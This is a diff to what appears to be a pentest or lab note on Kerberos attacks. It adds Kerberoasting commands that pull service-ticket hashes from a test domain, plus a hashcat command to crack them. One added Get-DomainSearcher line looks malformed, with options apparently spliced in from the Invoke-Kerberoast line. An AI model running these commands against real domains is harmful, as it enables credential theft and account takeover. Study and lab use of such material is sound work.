@@ -108,5 +108,7 @@ TGT and TGS:
 ```
 Import-module .\Invoke-Kerberoast.ps1
 Get-DomainSearcher -Domain testlab.local
-Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)'
+Invoke-Kerberoast -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
+hashcat64.exe -m 13100 hash.txt pass.txt --force
+Get-DomainSearcher -Domain testlab.local -LDAPFilter '(samAccountType=805306368/serviceprincipalname=*http*)' -AdminCount -OutputFormat Hashcat | Select hash | ConvertTo-CSV -NoTypeInformation
 ```
